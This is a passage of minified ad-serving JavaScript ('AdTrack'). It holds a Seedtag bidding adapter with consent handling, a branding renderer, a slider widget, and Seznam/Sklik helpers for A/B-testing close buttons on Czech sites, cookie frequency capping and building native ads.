          e && e.cookieSync && n.track.shouldCsync("seedtag") && AdTrack.UserSync.addUserSync("seedtag", 157, function () {
            AdTrack.SeedtagHbCSync(e.cookieSync);
          }, n.track.settings), n.response = e, t && t(n.price, e);
        }).fail(function (e, i) {
          i ? n.track.evBidTimeout(n.definition, n.chd) : n.track.evBidError(n.definition, n.chd), n.price = null, t && t(null, null);
        }).send();
      } else this.track.doError("[" + this.chd.tag + "] Seedtag accountId not defined.");
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.bids && t.bids[0] && t.bids[0].price && t.bids[0].content) {
            var e = t.bids[0];
            this.adData = e.ad, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.content,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t, e) {
      var i = AdTrack.Utils.simpleStringGenerator(14),
        r = t.split("-");
      2 !== r.length && this.track.doError("[" + this.chd.tag + "] Wrong format for key, should be: [placement]-[adUnitId]");
      var n = {
          id: i,
          transactionId: AdTrack.Utils.uuid(),
          requestCount: 1,
          sizes: this.sizes,
          supplyTypes: ["display"],
          placement: r[0],
          adUnitId: r[1],
          adUnitCode: "r2b2-seedtag"
        },
        s = {
          url: AdTrack.url,
          publisherToken: e,
          cmp: !1,
          timeout: this.chd.timeout || 800,
          version: "5.18.0",
          connectionType: this.getConnectionType(),
          bidRequests: [n]
        },
        a = !1,
        o = !1;
      if (AdTrack.CMP) {
        var d = AdTrack.CMP.getConsentData();
        d && (a = !0, s.ga = d.gdprApplies, s.cd = d.consentString, s.cmp = !!d.consentString);
      }
      if (AdTrack.USP) {
        var c = AdTrack.USP.getConsentData();
        c && c.consentString && (o = !0, s.uspConsent = c.consentString);
      }
      return (a || o) && this.track.evBidConsent(this.definition, this.chd, a, o), s;
    },
    getConnectionType: function () {
      try {
        var t = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        switch (t.type || t.effectiveType) {
          case "wifi":
          case "ethernet":
            return "fixed";
          case "cellular":
          case "wimax":
            return "mobile";
          default:
            return /iPad|iPhone|iPod/.test(navigator.userAgent) || /android/i.test(navigator.userAgent) ? "unknown" : "fixed";
        }
      } catch (t) {
        return this.track.doError("[" + this.chd.tag + "] Error in getConnectionType: " + t.message, "debug"), "unknown";
      }
    }
  }, AdTrack.SeedtagHbCSync = AdTrack.SeedtagHbCSync || (i = !1, function (t) {
    i || (AdTrack.Utils.csyncFrame(t), i = !0);
  });
}, function (t, e) {
  AdTrack.Player = function (t, e, i, r, n) {
    this.fp = null, this.iframe = null, this.container = t, this.onload = [], this.playing = !1, this.init(t, e, i, r, n);
  }, AdTrack.Player.prototype = {
    getContainer: function () {
      return this.container;
    },
    ready: function (t) {
      this.fp ? t() : this.onload.push(t);
    },
    play: function () {
      this.playing || this.ready(function () {
        this.playing = !0, this.fp.play();
      }.bind(this));
    },
    dispose: function () {
      this.ready(function () {
        this.fp.dispose();
      }.bind(this));
    },
    getFrame: function () {
      return this.iframe;
    },
    init: function (t, e, i, r, n) {
      var s = '<html><head></head><body><script src="//' + n + '/lib/js/player/fp.packed.js"><\/script><script>init("' + i + '",' + JSON.stringify(e) + "," + JSON.stringify(r) + ',"' + n + '");<\/script></body></html>',
        a = {
          onBeforeAppend: function (t) {
            var e = t.element;
            e.setAttribute("style", "border:0; margin:auto; width:100%; height:0; display: block;"), e.setAttribute("frameborder", "0"), e.setAttribute("marginheight", "0"), e.setAttribute("marginwidth", "0"), e.setAttribute("scrolling", "no");
          }.bind(this)
        },
        o = AdTrack.iframeCreator(t, s, a, window.location.href, !0);
      this.iframe = o.element, this.iframe.contentWindow.addEventListener("load", function () {
        this.fp = this.iframe.contentWindow.AdTrack.FP, this.fp.on("ready", function () {
          this.loaded();
        }.bind(this));
      }.bind(this), !1);
    },
    loaded: function () {
      this.onload.forEach(function (t) {
        "function" == typeof t && t();
      });
    },
    on: function (t, e) {
      this.ready(function () {
        this.fp.on(t, e);
      }.bind(this));
    }
  };
}, function (t, e) {
  AdTrack.BrandingRenderer = function (t, e, i, r, n, s) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.transforms = i, this.events = r, this.container = null, this.errorReporting = n, this.metrics = s, this.brandingMinWidth = 1200, this.brandingMaxScroll = 160;
  }, AdTrack.BrandingRenderer.prototype = {
    loaded: function (t) {
      AdTrack.DOM.resetBranding = function () {
        this.transforms && this.transforms.revert();
      }.bind(this);
      var e = this.definition.options.noStacking,
        i = 0;
      if (this.definition.options.mainZIndex && (i = this.definition.options.mainZIndex), t.data.width) {
        this.transforms.styleElement(this.container, "width", t.data.width + "px"), this.transforms.styleElement(this.container, "height", "auto"), this.transforms.styleElement(this.container, "overflow", "visible"), this.transforms.styleElement(this.container, "top", (this.definition.options.brandingTop ? this.definition.options.brandingTop : 0) + "px"), this.transforms.styleElement(this.container, "position", "fixed"), e || this.transforms.styleElement(this.container, "z-index", i - 1), this.transforms.styleElement(this.container, "left", "50%"), this.transforms.styleElement(this.container, "margin-left", "-" + Math.round(t.data.width / 2) + "px"), this.transforms.styleElement(this.container, "display", "none"), this.transforms.styleElement(this.container, "pointer-events", "auto", "important");
        try {
          if (this.definition.options.main) {
            var r = this.window.document.querySelector(this.definition.options.main);
            if (r) {
              if (e || (this.transforms.styleElement(r, "position", "relative"), this.transforms.styleElement(r, "z-index", i)), this.definition.options.setZIndex) {
                var n = this.definition.options.setZIndex;
                for (var s in n) if (n.hasOwnProperty(s)) {
                  var a = isNaN(s) ? s : n[s],
                    o = isNaN(s) ? n[s] : i;
                  if (a) {
                    var d = this.window.document.querySelector(a);
                    d && (this.transforms.styleElement(d, "z-index", o, "important"), "static" == this.getStyleProperty(d, "position") && this.positioningNotSet(d) && this.transforms.styleElement(d, "position", "relative"));
                  }
                }
              }
              this.definition.options.mainMarginTop && this.transforms.styleElement(r, "margin-top", this.definition.options.mainMarginTop + "px"), this.definition.options.mainForceWidth && (this.transforms.styleElement(r, "max-width", this.definition.options.mainForceWidth + "px"), this.transforms.styleElement(r, "margin-left", "auto"), this.transforms.styleElement(r, "margin-right", "auto")), this.transforms.styleElement(this.container, "display", "block");
            } else this.errorReporting.doError("Unknown main branding selector " + this.definition.options.main);
          }
        } catch (t) {
          this.errorReporting.doError("Branding error (" + t + ")");
        }
      } else this.errorReporting.doError("Undefined width");
    },
    isReadyToShow: function (t) {
      return !0;
    },
    measureImpress: function () {
      var t = this.window,
        e = t.document,
        i = this.container,
        r = void 0 !== t.pageXOffset,
        n = "CSS1Compat" === (e.compatMode || ""),
        s = r ? t.pageYOffset : n ? e.documentElement.scrollTop : e.body.scrollTop;
      if (e.documentElement.clientWidth >= this.brandingMinWidth || s <= this.brandingMaxScroll) try {
        var a = i.getBoundingClientRect();
        if ("width" in a && !a.width) l = null;else var o = a.right - a.left,
          d = a.bottom - a.top,
          c = AdTrack.Utils.getViewportRealWidth(t),
          h = AdTrack.Utils.getViewportRealHeight(t),
          l = Math.max(0, Math.min(a.right, c) - Math.max(a.left, 0)) * Math.max(0, Math.min(a.bottom, h) - Math.max(a.top, 0)) / (o * d);
        return l > .25 ? 1 : 0;
      } catch (t) {
        return 1;
      }
      return 0;
    },
    getContainer: function () {
      return this.container;
    },
    createContainer: function (t) {
      return this.container || (this.mainWrap = t, this.container = t), this.container;
    },
    destroy: function () {},
    show: function () {
      this.mainWrap && (this.mainWrap.style.display = "block");
    },
    hide: function () {
      this.mainWrap && (this.mainWrap.style.display = "none");
    },
    open: function () {},
    close: function () {},
    getStyleProperty: function (t, e) {
      return this.window.getComputedStyle ? (e = e.replace(/([A-Z])/g, "-$1").toLowerCase(), this.window.getComputedStyle(t, null).getPropertyValue(e)) : t.style[e];
    },
    positioningNotSet: function (t) {
      var e = this.getStyleProperty(t, "top"),
        i = this.getStyleProperty(t, "bottom"),
        r = this.getStyleProperty(t, "left"),
        n = this.getStyleProperty(t, "right");
      return !("auto" != e && "0px" != e || "auto" != i && "0px" != i || "auto" != r && "0px" != r || "auto" != n && "0px" != n);
    }
  };
}, function (t, e) {
  var i, r, n, s, a, o, d, c, h, l, u, p, f, g;
  AdTrack.Slider = AdTrack.Slider || (i = "AdTrack-slider-wrapper", r = "AdTrack-slider-items", n = "AdTrack-slider-item", s = "AdTrack-slider-next", a = "AdTrack-slider-prev", o = "AdTrack-slider-pick", d = "data-slider-size", c = "data-item-size", h = "data-slider-direction", l = "data-slider-start", u = "data-slider-autoslide", p = "data-slider-threshold", f = {
    horizontal: {
      point: "clientX"
    },
    vertical: {
      point: "clientY"
    }
  }, g = function (t) {
    var e,
      g,
      m = t.ownerDocument || document,
      k = t.querySelector("." + i),
      b = k ? k.querySelector("." + r) : null,
      v = b ? b.querySelectorAll("." + n) : [],
      A = v.length,
      T = t.querySelectorAll("." + s),
      y = t.querySelectorAll("." + a),
      w = t.querySelectorAll("." + o),
      C = 0,
      U = 300,
      x = .2,
      S = 0,
      E = null,
      P = "horizontal",
      R = "clientX",
      I = parseInt(k.getAttribute(l)),
      O = parseInt(k.getAttribute(p)),
      D = parseInt(k.getAttribute(u)),
      B = k.getAttribute(h);
    !isNaN(I) && I >= 0 && I < A && (C = I), !isNaN(O) && O > 0 && O < 100 && (x = .01 * O), !isNaN(D) && D > 0 && (S = 1e3 * D), f[B] && (P = B, R = f[B].point), Array.prototype.forEach.call(y, function (t) {
      t.addEventListener("click", function () {
        L(C - 1);
      });
    }), Array.prototype.forEach.call(T, function (t) {
      t.addEventListener("click", function () {
        L(C + 1);
      });
    }), Array.prototype.forEach.call(w, function (t, e) {
      e >= 0 && e < A && t.addEventListener("click", function () {
        L(e);
      });
    }), e = parseInt(k.getAttribute(d)), g = parseInt(k.getAttribute(c)), e = !isNaN(e) && e > 100 ? e : 0, g = !isNaN(g) && g > 100 ? g : 0, e = e || g || 300, (g = g || e || 300) > e && (g = e);
    var N = (e - (U = g)) / 2,
      _ = !1,
      M = 0,
      H = 0,
      z = 0,
      j = 0,
      L = function (t) {
        !function (t) {
          w[t] && (w[t].setAttribute("class", "AdTrack-slider-pick AdTrack-slider-pick-active"), w[C] && t !== C && w[C].setAttribute("class", "AdTrack-slider-pick"));
        }(t), t < 0 && (t = 0), t >= A && (t = A - 1), C = t, H = -t * U, Y();
      },
      V = function (t) {
        t = -t;
        var e = Math.floor(Math.abs(t / U)),
          i = t % U;
        (t < 0 && i < -x * U || t >= 0 && i > x * U) && (e += 1), L(t < 0 ? C - e : C + e);
      },
      q = function (t) {
        t = t || window.event, _ = !1, X(), K(), M = H, "touchstart" === t.type ? z = t.touches[0][R] : (z = t[R], m.addEventListener("mouseup", W), m.addEventListener("mousemove", F));
      },
      W = function (t) {
        t = t || window.event;
        var e = H - M;
        _ = Math.abs(e) > 5, G(), J(), e < -x * U ? V(e) : e > x * U ? V(e) : (H = M, Y()), m.removeEventListener("mouseup", W), m.removeEventListener("mousemove", F);
      },
      F = function (t) {
        (t = t || window.event).preventDefault();
        var e = (j = "touchmove" === t.type ? t.touches[0][R] : t[R]) - z;
        z = j, H += e, Y();
      },
      G = function () {
        b.style.transition = "transform .2s ease-out";
      },
      K = function () {
        b.style.transition = "";
      },
      J = function () {
        S && !E && (E = setInterval(function () {
          G(), L(C >= A - 1 ? 0 : C + 1);
        }, S));
      },
      X = function () {
        E && (clearInterval(E), E = null);
      },
      Y = function () {
        var t = "translate(" + H + "px, 0px)";
        "horizontal" !== P && (t = "translate(0px," + H + "px)"), b.style.webkitTransform = t, b.style.MozTransform = t, b.style.msTransform = t, b.style.OTransform = t, b.style.transform = t;
      };
    k && b && A > 0 && (function () {
      k.style.overflow = "hidden";
      var t = "horizontal" === P ? U * A + "px" : "100%",
        e = "vertical" === P ? U * A + "px" : "100%";
      b.style.display = "block", b.style.width = t, b.style.height = e, b.style.paddingLeft = N + "px", b.style.paddingRight = N + "px", b.style.boxSizing = "content-box", Array.prototype.forEach.call(v, function (t) {
        var e = "horizontal" === P ? U + "px" : "100%",
          i = "vertical" === P ? U + "px" : "100%";
        t.style.display = "block", t.style.float = "left", t.style.margin = "0", t.style.padding = "0", t.style.width = e, t.style.height = i;
      });
    }(), b.addEventListener("mousedown", q), b.addEventListener("touchstart", q), b.addEventListener("touchend", W), b.addEventListener("touchmove", F), b.addEventListener("click", function (t) {
      _ && t.preventDefault(), _ = !1;
    }), L(C), J());
  }, {
    create: function (t) {
      return new g(t);
    }
  });
}, function (t, e) {
  AdTrack.SeznamHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, !0 === this.definition.test && this.track.doError("Test environment for seznam ads is set"), this.impPixels = [], "seznam-ssp" == i.tag && (this.ssspTests(), "vignette" === this.track.definition.renderer || this.track.definition.renderer);
  }, AdTrack.SeznamHelper.prototype = {
    getKeyBasedOnStyle: function (t, e) {
      var i,
        r = null,
        n = 0;
      return t && (t.product && (i = t.product.count ? t.product.count : 0), t.normal && (n = t.normal.count ? t.normal.count : 0), r = i || n ? this.track.getChannelKey(e, i > n ? t.product : t.normal) : this.track.getChannelKey(e, null)), r;
    },
    impressTracking: function (t) {
      t && this.track.renderer.on("impress", function () {
        "string" == typeof t ? AdTrack.Utils.firePixel(t) : Array.prototype.forEach.call(t, function (t) {
          AdTrack.Utils.firePixel(t);
        });
      });
    },
    servedTracking: function (t, e) {
      e && sssp ? sssp.served(t) : "string" == typeof t ? this.impPixels.push(t) : this.impPixels = this.impPixels.concat(t);
    },
    isLangAllowed: function () {
      var t = AdTrack.Utils.deepAccess(this.track, "definition.info.language");
      return !t || "Czech" === t || -1 !== AdTrack.Utils.getLanguage().indexOf("cs");
    },
    isCapped: function () {
      var t = null;
      if (this.definition.options.customSeznamCappingLimit && this.definition.options.customSeznamCappingDelay) {
        var e = "AdTrack-sz-capped-" + this.track.domain + "-" + this.track.type + "-" + this.track.group + "-" + this.track.position;
        t = AdTrack.Cookies.getCookie(e, !0);
      }
      return !!t;
    },
    applyTest: function (t, e) {
      var i = t.length,
        r = Math.floor(Math.random() * i),
        n = "var" + (r + 1),
        s = /var\d/;
      this.chd.flag ? s.test(this.chd.flag) ? this.chd.flag = this.chd.flag.replace(s, n) : this.chd.flag += "-" + n : this.chd.flag = n, this.chd.keys[1] = t[r];
      var a = e[r];
      for (var o in a) a.hasOwnProperty(o) && (this.definition.options[o] = a[o]);
    },
    ssspTests: function () {
      var t = this.track.unitID.getName();
      if (this.chd.keys[1]) {
        var e = [[{
            closerPos: "right",
            closerIcon: 0,
            closerSizeCoeff: 1,
            closerCaption: "zavřít reklamu",
            fixedShowAdNotice: 0,
            closerTest: 1,
            squareSetup: 2,
            allowSquare: 1
          }], [{
            bottomCloser: 1,
            bottomCloserPosition: "right",
            fixedShowAdNotice: 1,
            bottomCloserColor: "#e41f1f",
            bottomClickTabColor: "#102447"
          }], [{
            closerPos: "right",
            closerIcon: 0,
            closerSizeCoeff: 1,
            closerCaption: "zavřít reklamu",
            fixedShowAdNotice: 0,
            colorBackCloser: "#3f3f3f",
            closerTest: 1,
            squareSetup: 3,
            allowSquare: 1
          }], [{}, {
            safeZone: 5,
            closerSizeCoeff: 1,
            closerVerticalPadding: 8.5,
            closerHorizontalPadding: 26,
            colorBack: "#3f3f3f",
            colorFront: "#ffffff",
            maxHeight: .25,
            seznam3: 1,
            closerTest: 1
          }, {
            closerSizeCoeff: 1,
            closerVerticalPadding: 8.5,
            closerHorizontalPadding: 26,
            colorBack: "#3f3f3f",
            colorFront: "#ffffff",
            maxHeight: .25,
            seznam3: 1,
            closerTest: 1
          }, {
            safeZone: 3,
            closerSizeCoeff: 1,
            closerVerticalPadding: 8.5,
            closerHorizontalPadding: 26,
            colorBack: "#3f3f3f",
            colorFront: "#ffffff",
            maxHeight: .25,
            seznam3: 1,
            closerTest: 1
          }], [{
            closerSize: "25",
            seznamVignetteCloserTest: 1
          }, {
            closerSize: "30",
            seznamVignetteCloserTest: 1
          }, {
            closerSize: "35",
            seznamVignetteCloserTest: 1
          }, {
            closerSize: "40",
            seznamVignetteCloserTest: 1
          }], [{
            offsetVertical: "8",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "10",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "12",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "14",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "16",
            seznamVignetteOffsetTest: 1
          }], [{
            offsetVertical: "8",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "10",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "12",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "14",
            seznamVignetteOffsetTest: 1
          }, {
            offsetVertical: "16",
            seznamVignetteOffsetTest: 1
          }]],
          i = {
            "mobile_svetkreativity.cz_generic_vignette": {
              test: 4,
              keys: [315416, 315422, 315413, 315419]
            },
            "mobile_zdravestravovani.eu_generic_vignette": {
              test: 4,
              keys: [315476, 315470, 315479, 315473]
            },
            "mobile_cnn.iprima.cz_generic_vignette": {
              test: 4,
              keys: [315488, 315485, 315482, 315491]
            },
            "mobile_drbna.cz_generic_vignette": {
              test: 4,
              keys: [315512, 315506, 315503, 315509]
            },
            "mobile_rajce.net_generic_gallery_vignette": {
              test: 5,
              keys: [315350, 315344, 315347, 315341, 315338]
            },
            "mobile_tn.cz_generic_vignette": {
              test: 5,
              keys: [315359, 315371, 315356, 315368, 315365]
            },
            "mobile_im.fdb.cz_generic_vignette": {
              test: 5,
              keys: [315374, 315380, 315383, 315386, 315377]
            },
            "mobile_ii.edna.cz_generic_vignette": {
              test: 5,
              keys: [315392, 315395, 315398, 315404, 315389]
            },
            "mobile_iletaky.cz_generic_vignette": {
              test: 6,
              keys: [315533, 315542, 315539, 315536, 315569]
            },
            "mobile_lidovky.cz_generic_vignette": {
              test: 6,
              keys: [315530, 315524, 315527, 315521, 315572]
            },
            "mobile_im.zena-in.cz_generic_vignette": {
              test: 6,
              keys: [315551, 315548, 315554, 315545, 315575]
            },
            "mobile_aktualne.cz_generic_vignette": {
              test: 6,
              keys: [315563, 315560, 315557, 315566, 315578]
            }
          };
        for (var r in i) if (i.hasOwnProperty(r) && t === r) {
          var n = i[r],
            s = -1;
          if (n.keys.forEach(function (t, e) {
            t == this.chd.keys[1] && (s = e);
          }.bind(this)), s >= 0) {
            var a = e[n.test][s];
            for (var o in a) a.hasOwnProperty(o) && (this.definition.options[o] = a[o]);
          }
        }
      }
    },
    vignetteTest: function () {
      var t = this.track.unitID.getName(),
        e = null;
      this.chd.keys[1] && ("mobile_parlamentnilisty.cz_generic_vignette" === t && 220542 == this.chd.keys[1] ? e = [249608, 220542] : "mobile_drbna.cz_generic_vignette" === t && 181746 == this.chd.keys[1] && (e = [249611, 181746]), e && this.applyTest(e, [{
        szTest: 1
      }, {}]));
    },
    reopenTest: function () {
      var t = null;
      "classic_podnikatel.cz_article_fixed" === this.track.unitID.getName() && (t = [63959, 227386, 227391]), t && this.chd.keys[1] && this.applyTest(t, [{
        customReopen: 1
      }, {
        customReopen: 1,
        customReopenRight: 1
      }, {
        customReopen: 0
      }]);
    },
    fadeInTest: function () {
      var t = this.track.unitID.getName(),
        e = null;
      this.chd.keys[1] && ("classic_nevimnews.cz_generic_fixed" === t && 183596 == this.chd.keys[1] ? e = [225306, 225311, 225316, 225321, 225326, 183596] : "classic_lupa.cz_article_fixed" === t && 63942 == this.chd.keys[1] && (e = [227401, 227406, 227411, 227416, 227421, 63942]), e && this.applyTest(e, [{
        transitionStart: "%%fixedWrap%% {transform: translateX(-100%);}",
        transitionMid: "%%fixedWrap%% {transition: transform 1s; transform: translateX(0%);}",
        transitionEnd: "%%fixedWrap%% {transition: transform 1s; transform: translateX(200%);}"
      }, {
        transitionStart: "%%fixedWrap%% {transform: translateX(100%);}",
        transitionMid: "%%fixedWrap%% {transition: transform 1s; transform: translateX(0%);}",
        transitionEnd: "%%fixedWrap%% {transition: transform 1s; transform: translateX(-200%);}"
      }, {
        transitionStart: "%%fixedWrap%% {transform: translateY(-150px) scale(0);}",
        transitionMid: "%%fixedWrap%% {transition: transform 1s; transform: translateY(0) scale(1);}",
        transitionEnd: "%%fixedWrap%% {transition: transform 0.8s; transform: translateY(-150px) scale(0);}"
      }, {
        transitionStart: "%%fixedAdWrap%% {transform: translate(-500px, -150px) scale(0);}%%fixedCloser.transformLayer%% {transform: translate(500px, -100px) scale(0);}",
        transitionMid: "%%fixedAdWrap%% {transition: transform 1s; transform: translate(0) scale(1);}%%fixedCloser.transformLayer%% {transition: transform 0.7s 0.5s; transform: translate(0) scale(1);}",
        transitionEnd: "%%fixedAdWrap%% {transition: transform 0.7s 0.2s; transform: translate(500px, -150px) scale(0);}%%fixedCloser.transformLayer%% {transition: transform 0.7s; transform: translate(500px, -100px) scale(0);}"
      }, {
        transitionStart: "@-webkit-keyframes pulse {0% { -webkit-transform: scale(1) translateY(100%); }60% { -webkit-transform: scale(1) translateY(0); }80% { -webkit-transform: scale(1.1); }100% { -webkit-transform: scale(1); }}%%fixedWrap%% { animation: pulse 1.3s ease-in-out;}"
      }, {}]));
    },
    vignetteFadeInTest: function () {
      var t = this.track.unitID.getName(),
        e = null;
      this.chd.keys[1] && ("mobile_drbna.cz_generic_vignette" === t && 181746 == this.chd.keys[1] && (e = [222511, 222516, 222521, 222526, 222531, 222536, 181746]), e && this.applyTest(e, [{
        transitionStart: "%%vignetteWrap%% {transform: translateX(-100%);}",
        transitionMid: "%%vignetteWrap%% {transition: transform 0.5s; transform: translateX(0%);}"
      }, {
        transitionStart: "%%vignetteWrap%% {transform: translateX(100%);}",
        transitionMid: "%%vignetteWrap%% {transition: transform 0.5s; transform: translateX(0%);}"
      }, {
        transitionStart: "%%vignetteWrap%% {transform: translateY(100%);}",
        transitionMid: "%%vignetteWrap%% {transition: transform 0.5s; transform: translateY(0%);}"
      }, {
        transitionStart: "%%vignetteWrap%% {transform: translateY(-100%);}",
        transitionMid: "%%vignetteWrap%% {transition: transform 0.5s; transform: translateY(0%);}"
      }, {
        transitionStart: "%%vignetteWrap%% {transform: translateY(-150px) scale(0);}",
        transitionMid: "%%vignetteWrap%% {transition: transform 0.5s; transform: translateY(0) scale(1);}"
      }, {
        css: "@-webkit-keyframes slideLeftTitle {0% { transform: translateX(-500px); }50% { transform: translateX(-500px); }100% { transform: translateX(0); }}@-webkit-keyframes slideLeftDesc {0% { transform: translateX(-500px); }60% { transform: translateX(-500px); }100% { transform: translateX(0); }}@-webkit-keyframes fadeIn {0% { opacity: 0; }100% { opacity: 1; }}.AdTrack-anim-img {-webkit-animation: fadeIn 1s ease-in-out 0s;}.AdTrack-anim-title {-webkit-animation: slideLeftTitle 1s ease-in-out 0s;}.AdTrack-anim-desc {-webkit-animation: slideLeftDesc 1.2s ease-in-out 0s;}"
      }, {}]));
    },
    capping: function () {
      if (this.definition.options.customSeznamCappingLimit && this.definition.options.customSeznamCappingDelay) {
        var t = this.definition.options.customSeznamCappingLimit,
          e = this.definition.options.customSeznamCappingDelay,
          i = Math.floor(AdTrack.Utils.timeToEndOfDay() / 1e3),
          r = "AdTrack-sz-imp-" + this.track.domain + "-" + this.track.type + "-" + this.track.group + "-" + this.track.position,
          n = "AdTrack-sz-capped-" + this.track.domain + "-" + this.track.type + "-" + this.track.group + "-" + this.track.position,
          s = AdTrack.Cookies.getCookie(r, !0);
        (s = s ? ++s : 1) > t - 1 ? AdTrack.Cookies.setCookie(n, 1, i, !0) : AdTrack.Cookies.setCookie(n, 1, e, !0), AdTrack.Cookies.setCookie(r, s, i, !0);
      }
    },
    parseAssets: function (t) {
      var e = {};
      try {
        t.forEach(function (t) {
          var i = {
              11: "title",
              12: "data",
              1: "img",
              2: "img"
            }[t.id],
            r = {
              11: "title",
              12: "description",
              1: "image",
              2: "imageSquare"
            }[t.id],
            n = t[i];
          n && (e[r] = n.text || n.value || {
            url: n.url,
            width: n.w,
            height: n.h
          });
        });
      } catch (t) {}
      return e;
    },
    processAppnexusAd: function (t, e) {
      var i = new AdTrack.AdSet();
      i.setStyle(e);
      var r = new AdTrack.AdChoices();
      r.setPromoClickUrl(this.chd.url), e && e.options.fixedShowAdNotice || this.definition.options.fixedShowAdNotice ? r.setPromoText("") : r.setPromoText(this.chd.title), r.setOptional(!0), i.addAdChoices(r);
      var n = new AdTrack.TextAd(),
        s = this.parseAssets(t.assets),
        a = t.link,
        o = s.image,
        d = s.imageSquare;
      n.addText(s.title, s.description), o && n.addScreenshot(o.url, o.width, o.height, o.url), d && n.addScreenshot(d.url, d.width, d.height, d.url);
      var c = !0 === this.definition.test ? "#" : a.url;
      n.setClickUrl(c), n.setCta("Navštívit stránku"), n.done(), i.addAd(new AdTrack.AppnexusAd(i, n));
      var h = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting);
      this.impPixels = this.impPixels.concat(t.imptrackers);
      var l = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: i,
              tc: h
            }
          },
          style: e,
          count: 1,
          impTrackers: this.impPixels
        },
        u = new AdTrack.MediaTypes.Native(l, this.track.errorReporting);
      return u.on("load", function () {
        if (t.jstracker) {
          var e = this.track.renderer.wrap || this.track.renderer.getContainer(),
            i = this.track.document.createElement("div");
          i.style.display = "none", e.appendChild(i);
          var r = this.track.renderer.wrap && this.track.renderer.wrap.id;
          document.writeTo(i, t.jstracker.replace("%native_dom_id%", r));
        }
      }.bind(this)), u;
    },
    processResult: function (t, e, i) {
      if (i || (i = "n/a"), !(t.length > 0)) return null;
      try {
        if (this.isBanner(t)) return t[0].eventTrackers && t[0].eventTrackers.impress && (this.impPixels = this.impPixels.concat(t[0].eventTrackers.impress)), this.renderBanner(t[0], e);
        var r,
          n,
          s = t.length;
        for (n = 0; n < t.length; n++) "SHOP" == t[n].adType && (r = t[n], s--);
        var a = new AdTrack.AdSet();
        a.setStyle(e);
        var o = new AdTrack.AdChoices();
        for (o.setPromoClickUrl(this.chd.url ? this.chd.url : "https://napoveda.sklik.cz/cz/co-je-reklama-sklik.html"), e && e.options.fixedShowAdNotice || this.definition.options.fixedShowAdNotice ? o.setPromoText("") : o.setPromoText(this.chd.title), o.setOptional(!0), a.addAdChoices(o), n = 0; n < t.length; n++) {
          var d = t[n];
          if (d.cta = "Navštívit stránku", d && d.eventTrackers && d.eventTrackers.impress && (this.impPixels = this.impPixels.concat(d.eventTrackers.impress)), "DRTG" != d.adType && "COMBINED" != d.adType && "BANNER" != d.adType || this.definition.options.customOverrideSeznamClick && (d.clickUrl = "//" + this.track.server + "/clk.php?url=" + encodeURIComponent(d.clickUrl)), "DRTG" == d.adType) a.addAd(new AdTrack.SklikProductAd(a, this.createProductAd(d, r, e)));else if ("DYNAMIC_BANNER" == d.adType) a.addAd(new AdTrack.SklikProductAd(a, this.createProductAd(d, r, e)));else if ("TXT" == d.adType) a.addAd(new AdTrack.SklikAd(a, this.createTextAdOld(d)));else if ("COMBINED" == d.adType) a.addAd(new AdTrack.SklikAd(a, this.createTextAdCombined(d)));else if ("SHOP" == d.adType) a.addShop(this.createShop(d));else {
            if (!d.adType || !d.headline1) return this.track.doError("Corrupt " + i + " ad. " + JSON.stringify(t)), null;
            a.addAd(new AdTrack.SklikAd(a, this.createTextAd(d)));
          }
        }
        var c = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
          h = {
            chd: this.chd,
            ad: {
              type: "tcproxy",
              data: {
                adSet: a,
                tc: c
              }
            },
            style: e,
            count: s,
            impTrackers: this.impPixels
          };
        return new AdTrack.MediaTypes.Native(h, this.track.errorReporting);
      } catch (t) {
        return this.track.doError("Sklik processing failed due to: " + t.message), null;
      }
    },
    createTextAdCombined: function (t) {
      var e = new AdTrack.TextAd();
      t.viewableImpressionUrl && e.setViewabilityTrackers([t.viewableImpressionUrl]);
      var i = t.adImageUrl + "?fl=res%2C600%2C%2C1|jpg%2C90",
        r = t.adSquareImageUrl + "?fl=res%2C600%2C%2C1|jpg%2C90",
        n = this.track.rhtmlspecialchars(t.shortHeadline).trim(),
        s = this.track.rhtmlspecialchars(t.longHeadline).trim(),
        a = this.track.rhtmlspecialchars(t.description).trim(),
        o = this.track.rhtmlspecialchars(t.cta),
        d = "//fimg-resp.seznam.cz/?spec=fav16x16&url=" + encodeURIComponent(t.adUrl),
        c = !0 === this.definition.test ? t.adUrl ? t.adUrl : this.track.noquerystring("//seznam.cz") : t.clickUrl;
      return s || this.track.doError("Long headline not included. (" + this.chd.tag + ")"), e.addScreenshot(i, 600, 314, i), e.addScreenshot(r, 600, 600, r), e.addText(n, a), e.setLongHeadline(s), e.setCompanyName(t.companyName), e.setLogoUrl(t.adLogoUrl), e.setSquareLogoUrl(t.adSquareLogoUrl), e.setClickUrl(c), e.setVisibleUrl(t.visibleUrl), e.setAdUrl(t.adUrl), e.setCta(o), e.setFavicon(d), e.done(), e;
    },
    createTextAd: function (t) {
      var e = new AdTrack.TextAd(),
        i = "//fimg-resp.seznam.cz/?spec=ft160x110&fast&url=" + encodeURIComponent(t.adUrl),
        r = "//fimg-resp.seznam.cz/?spec=ft280x130&fast&url=" + encodeURIComponent(t.adUrl),
        n = (encodeURIComponent(t.adUrl), this.track.rhtmlspecialchars(t.headline1).trim()),
